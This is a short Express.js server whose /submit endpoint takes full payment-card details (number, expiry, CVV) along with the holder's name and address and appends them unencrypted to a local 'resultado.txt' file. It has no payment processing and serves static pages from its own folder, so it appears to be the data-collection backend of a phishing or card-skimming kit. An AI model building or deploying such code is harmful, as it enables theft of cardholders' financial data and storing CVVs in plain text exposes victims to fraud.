const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static(__dirname));

app.post('/submit', (req, res) => {
  const { cardnumber, expmonth, expyear, cvv, firstname, lastname, address } = req.body;
  const entry = `Card Number: ${cardnumber}\nMonth: ${expmonth}\nYear: ${expyear}\nCVV: ${cvv}\nName: ${firstname} ${lastname}\nAddress: ${address}\n---\n`;
  const filePath = path.join(__dirname, 'resultado.txt');
  fs.appendFile(filePath, entry, (err) => {
    if (err) {
      return res.status(500).json({ message: 'Error saving data.' });
    }
    res.status(200).json({ message: 'Data saved.' });
  });
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
